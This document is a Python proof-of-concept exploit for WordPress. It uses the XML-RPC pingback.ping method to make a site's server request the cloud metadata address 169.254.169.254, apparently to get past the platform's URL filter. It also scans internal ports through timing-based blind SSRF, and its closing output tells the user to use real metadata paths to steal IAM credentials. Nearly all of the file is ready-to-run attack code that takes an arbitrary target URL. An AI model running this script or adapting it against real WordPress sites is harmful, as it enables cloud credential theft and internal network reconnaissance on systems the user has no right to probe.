#!/usr/bin/env python3
"""
WordPress SSRF via Cloud Metadata Bypass
Tests wp_http_validate_url() bypass of 169.254.0.0/16

Usage: python3 poc.py <target_url>
Example: python3 poc.py http://localhost:8080
"""

import requests
import time
import sys

# Cloud metadata endpoints (link-local 169.254.0.0/16 not blocked by WordPress)
METADATA_HOST = "169.254.169.254"

def check_xmlrpc(target_url):
    """Check if XML-RPC is enabled."""
    print("[*] Checking XML-RPC availability...")
    try:
        response = requests.post(
            f"{target_url}/xmlrpc.php",
            data="""<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>""",
            headers={"Content-Type": "text/xml"},
            timeout=10
        )
        if "pingback.ping" in response.text:
            print("[+] XML-RPC enabled and pingback.ping available")
            return True
        else:
            print("[-] XML-RPC available but pingback.ping not found")
            return False
    except:
        print("[-] XML-RPC not accessible")
        return False

def test_filter_bypass(target_url):
    """Test if wp_http_validate_url allows the cloud metadata endpoint."""
    print(f"\n[*] Testing filter bypass for {METADATA_HOST}...")
    
    metadata_url = f"http://{METADATA_HOST}/latest/meta-data/"
    post_url = f"{target_url}/?p=1"
    
    start = time.time()
    try:
        response = requests.post(
            f"{target_url}/xmlrpc.php",
            data=f"""<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>{metadata_url}</string></value></param>
    <param><value><string>{post_url}</string></value></param>
  </params>
</methodCall>""",
            headers={"Content-Type": "text/xml"},
            timeout=15
        )
        elapsed = time.time() - start
        
        if elapsed > 0.5:
            print(f"[+] FILTER BYPASSED: {METADATA_HOST} allowed (took {elapsed:.2f}s)")
            print(f"[+] On cloud-hosted WP, this would fetch IAM credentials")
            return True
        else:
            print(f"[-] Filter blocked the URL (took {elapsed:.2f}s)")
            return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def scan_internal_port(target_url, port):
    """Scan internal port via timing-based blind SSRF."""
    metadata_url = f"http://{METADATA_HOST}:{port}/"
    post_url = f"{target_url}/?p=1"
    
    start = time.time()
    try:
        requests.post(
            f"{target_url}/xmlrpc.php",
            data=f"""<?xml version="1.0"?>
<methodCall><methodName>pingback.ping</methodName>
<params>
  <param><value><string>{metadata_url}</string></value></param>
  <param><value><string>{post_url}</string></value></param>
</params></methodCall>""",
            headers={"Content-Type": "text/xml"},
            timeout=15
        )
    except:
        pass
    elapsed = time.time() - start
    
    if elapsed > 0.5:
        status = "OPEN/FILTERED"
    else:
        status = "CLOSED"
    print(f"  Port {port:>5}: {status} ({elapsed:.2f}s)")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://localhost:8080")
        sys.exit(1)
    
    target = sys.argv[1].rstrip("/")
    print(f"Target: {target}\n")
    
    if not check_xmlrpc(target):
        sys.exit(1)
    
    test_filter_bypass(target)
    
    print("\n[*] Internal port scan via blind SSRF:")
    for port in [22, 80, 443, 3306, 6379, 8080, 9200]:
        scan_internal_port(target, port)
    
    print("\n[*] Done.")
    print("[*] On cloud-hosted WordPress (AWS/DO/Oracle/Alibaba),")
    print(f"[*] replace {METADATA_HOST} with actual metadata paths to steal IAM credentials.")
